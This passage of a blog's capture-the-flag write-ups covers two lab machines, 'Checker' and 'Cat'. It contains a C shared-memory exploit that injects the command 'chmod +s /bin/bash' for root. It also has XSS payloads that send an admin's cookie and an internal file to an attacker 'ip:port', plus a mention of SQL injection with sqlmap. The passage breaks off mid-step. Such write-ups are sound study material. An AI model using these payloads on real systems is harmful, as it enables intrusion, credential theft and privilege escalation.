<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_17.png" alt="image.png" />
<br /><br />
It says a secret necessary for the verification code is in ~/google-authenticator. We may try to generate our own verification code through this secret
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_18.png" alt="image.png" />
<br /><br />
<code class="language-plaintext highlighter-rouge">/ajax/page/&lt;id&gt;/save-draft</code> could be the endpoint for expose the file we need
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_19.png" alt="image.png" />
<br /><br />
It’s time to find a Proof Of Concept to perform this attack.
<br /><br />
According with this blog post, we can use php_filter_chains_oracle_exploit to abuse this vulnerability.
<br /><br />
https://fluidattacks.com/es/blog/lfr-via-blind-ssrf-book-stack
<br /><br />
Basically this version of bookstack is using intervention image library which handles with images, it is taking all images that are present in the html source, uploading them to the server and converting the source to an url
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_20.png" alt="image.png" />
<br /><br />
Then it is getting the file extension and storing the image into a repo and the url is returned
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_21.png" alt="image.png" />
<br /><br />
If we get deeper understanding of how it is uploading the image we might be able to trick the server to disclose information 
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_22.png" alt="image.png" />
<br /><br />
The function make can take a url, a path or a binary like it is usually here
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_23.png" alt="image.png" />
<br /><br />
Driver in charge to init the image is sending a GET request to the given url to load the image, we have full control over this url
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_24.png" alt="image.png" />
<br /><br />
There is a method to use a <code class="language-plaintext highlighter-rouge">php://</code> wrapper to filter contents we can learn more of this here:
<br /><br />
https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle
<br /><br />
Now it is time to exploit this, capture the request performed by the following endpoint
<br /><br />
<code class="language-plaintext highlighter-rouge">/BookStack/public/ajax/page/7/save-draft</code>
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_25.png" alt="image.png" />
<br /><br />
Get the authorization cookies needed for this
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_26.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_27.png" alt="image.png" />
<br /><br />
Use the next exploit setting necessary flags using <code class="language-plaintext highlighter-rouge">/etc/passwd</code> as a test file to see that it is working properly, we can use the proxy to have more control over what is happening
<br /><br />
<a href="https://github.com/synacktiv/php_filter_chains_oracle_exploit">https://github.com/synacktiv/php_filter_chains_oracle_exploit</a>
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_28.png" alt="image.png" />
<br /><br />
Forward all requests
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_29.png" alt="image.png" />
<br /><br />
Now that we know this is a valid vector attack, we need to find a way to get the OTP secret, in a book created previously for bob there are clues for the home directory 
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_30.png" alt="image.png" />
<br /><br />
connect the dots and access the <code class="language-plaintext highlighter-rouge">.google_authenticator</code> file with the secret
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_31.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_32.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_33.png" alt="image.png" />
<br /><br />
Now use TOTP web application to enter the secret and get the verification code 
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_34.png" alt="image.png" />
<br /><br />
That’s how we get the user flag
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_35.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
Use <code class="language-plaintext highlighter-rouge">sudo -l</code> to see binaries allowed to run as root
<br /><br />
<code class="language-plaintext highlighter-rouge">Check-leak.sh</code> is allowed to run as root, it is a custom script that given a username it sanitize the input keeping only alphanumeric characters and use a binary to determine if the username was leaked or not
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_36.png" alt="image.png" />
<br /><br />
Download <code class="language-plaintext highlighter-rouge">cheack_leak</code> binary to inspect it meticulously 
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_37.png" alt="image.png" />
<br /><br />
Use FreeIDA software for this task, identify main function
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_38.png" alt="image.png" />
<br /><br />
This function is checking leaked hashes in a file, if the password is leaked open a shared memory location to execute a command querying the information for the hash in the database
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_39.png" alt="image.png" />
<br /><br />
Here we have the <code class="language-plaintext highlighter-rouge">write_to_shm</code> function, we can notice how the address memory is chosen, it takes the current time, initializes the random function taking time as seed, and generates a pseudo-random number between 0-0xFFFFF (1048575). Then it try to access to that memory address and gets a pointer for it. A message is written in this memory address with the time and hash 
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_40.png" alt="image.png" />
<br /><br />
This memory location is used for the notify user function
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_41.png" alt="image.png" />
<br /><br />
This function assure the string “Leaked hash detected” is present in this memory address, then the pointer is set to point the message from the ASCII 62 (&gt;)
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_42.png" alt="image.png" />
<br /><br />
Set the pointer after the (&gt;) cut and clean and verify the hash
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_43.png" alt="image.png" />
<br /><br />
With this the mysql query is performed
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_44.png" alt="image.png" />
<br /><br />
Here we have a clear view of what notify user is doing with its key points
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_45.png" alt="image.png" />
<br /><br />
It’s time to use all this information to create a exploit that inject the memory address with the information we want the query to execute, use the same structure to create the seed, verify the memory reservation and access the pointer to inject the message. We can use pure C or C libraries in python
<br /><br /></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/ipc.h&gt;</span><span class="c1"> //Key_t</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/shm.h&gt;</span><span class="c1"> //sh *</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="c1">//Get time</span>
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v4</span> <span class="o">=</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">//Init randomic function</span>
	<span class="n">srand</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
	
	<span class="n">key_t</span> <span class="n">key</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="mh">0xFFFFF</span><span class="p">;</span>
	
	<span class="c1">//Create shared memory and check</span>
		<span class="kt">int</span> <span class="n">shmid</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="n">IPC_CREAT</span> <span class="o">|</span> <span class="mo">0666</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">shmid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"shmget failed"</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="c1">// attach shared memory and gets its pointer</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">share_memory</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">share_memory</span> <span class="o">==</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">){</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"shmat failed"</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">message</span> <span class="o">=</span> <span class="s">"Leaked hash detected &gt; '; chmod +s /bin/bash;#"</span><span class="p">;</span>
	<span class="c1">//Inject memory</span>
	<span class="n">snprintf</span><span class="p">(</span><span class="n">share_memory</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
	
	<span class="n">printf</span><span class="p">(</span><span class="s">"Message in shared memory: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">share_memory</span><span class="p">);</span>
	
	<span class="c1">//detach shared memory</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">shmdt</span><span class="p">(</span><span class="n">share_memory</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"shmdt failed"</span><span class="p">);</span>
		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
	
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<p><br /><br />
Compile the script and create a loop to be injecting the generated memory address
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">output</span> <span class="n">script</span><span class="p">.</span><span class="n">c</span>

</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_46.png" alt="image.png" />
<br /><br />
Run the sudo command and verify that the setuid was applied correctly
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_47.png" alt="image.png" />
<br /><br />
Machine pwned!!!!
<script src="/assets/js/matrix-overlay.js"></script></p>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Checker]]></summary></entry><entry><title type="html">Cat-Linux-Medium</title><link href="https://your-site-url/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html" rel="alternate" type="text/html" title="Cat-Linux-Medium" /><published>2025-07-17T16:05:57+00:00</published><updated>2025-07-17T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html"><![CDATA[<h1 id="cat">Cat</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
Start enumerating ports, only two are opened
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image.png" alt="image.png" />
<br /><br />
Check web application running on it
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_1.png" alt="image.png" />
<br /><br />
We could self-register a new account
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_2.png" alt="image.png" />
<br /><br />
And we are able to upload a cat info
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_3.png" alt="image.png" />
<br /><br />
To have a deeper knowledge about this site, we could perform a fuzzing searching for directories or php files 
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_4.png" alt="image.png" />
<br /><br />
Nothing interesting in the previous dictionary try with another one
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_5.png" alt="image.png" />
<br /><br />
Effectively there is a repository behind it
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_6.png" alt="image.png" />
<br /><br />
Use git dumper for extract files in this project
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_7.png" alt="image.png" />
<br /><br />
Now we can check the backend to find vulnerabilities
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_8.png" alt="image.png" />
<br /><br />
In admin.php an admin username is disclosed
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_9.png" alt="image.png" />
<br /><br />
By the way, username field is not sanitized in here
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_10.png" alt="image.png" />
<br /><br />
The cat name parameter is used in a sql query as it is send by the user
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_11.png" alt="image.png" />
<br /><br />
Here we can build two potential vector attacks, a XSS in the username that could steal the cookie of the admin when the registered users are requested, and a SQL injection in the accept cat endpoint, which is available only as admin
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
So, first set a xss payload to obtain admin flag, by now just put payload in the username field
<br /><br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script <span class="nv">src</span><span class="o">=</span>x <span class="nv">onerror</span><span class="o">=</span>this.src<span class="o">=</span><span class="s2">"http://ip:port/?c="</span>+encodeURIComponent<span class="o">(</span>document.cookie<span class="o">)&gt;</span>&lt;/script&gt;
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_12.png" alt="image.png" />
<br /><br />
Now register a new cat with that account, that’s how the admin could load the payload name
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_13.png" alt="image.png" />
<br /><br />
Get admin cookie
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_14.png" alt="image.png" />
<br /><br />
A new endpoint is available here
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_15.png" alt="image.png" />
<br /><br />
As we saw before accept_cat endpoint has sql injection, we can use sqlmap here, note that the admin cookie is needed here
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_16.png" alt="image.png" />
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_17.png" alt="image.png" />
<br /><br />
rosa hash is crackeable
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_18.png" alt="image.png" />
<br /><br />
Get access through ssh 
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_19.png" alt="image.png" />
<br /><br />
Looking around we have access to logs, sometimes those files do not encrypt data
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_20.png" alt="image.png" />
<br /><br />
Effectively we have axel password disclosed
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_21.png" alt="image.png" />
<br /><br />
User flag was there!!
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_22.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
The last step give us a clue about a possible privilege escalation attack, we have a mail where it is being persistent in a new management system on port 3000
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_23.png" alt="image.png" />
<br /><br />
That port is open here
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_24.png" alt="image.png" />
<br /><br />
Forward those ports to see what is going on
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_25.png" alt="image.png" />
<br /><br />
Gitea is being used to this purpose
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_26.png" alt="image.png" />
<br /><br />
As a first steps check versions, this seems to be an oldie one because right now they are on 1.23 version
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_27.png" alt="image.png" />
<br /><br />
This vulnerability consist in a stored xss where someone could leverage description field in a repo to plant a javascript payload trying to retrieve the content of /administrator/Employee-management/raw/branch/main/index.php which has important information about the administrator which according to the mail seems to be jorbert
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_28.png" alt="image.png" />
<br /><br />
Prepare the payload
<br /><br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"javascript.fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response =&gt; response.text()).then(data =&gt; fetch('http://ip:port/?content='+encodeURIComponent(data)))"</span><span class="o">&gt;</span>hahaha&lt;/a&gt;
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_29.png" alt="image.png" />
<br /><br />
This is our malicious repo
<br /><br />
<img src="/assets/images/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb_image_30.png" alt="image.png" />
<br /><br />
Now send an email to jobert as it is said in the mail
<br /><br />
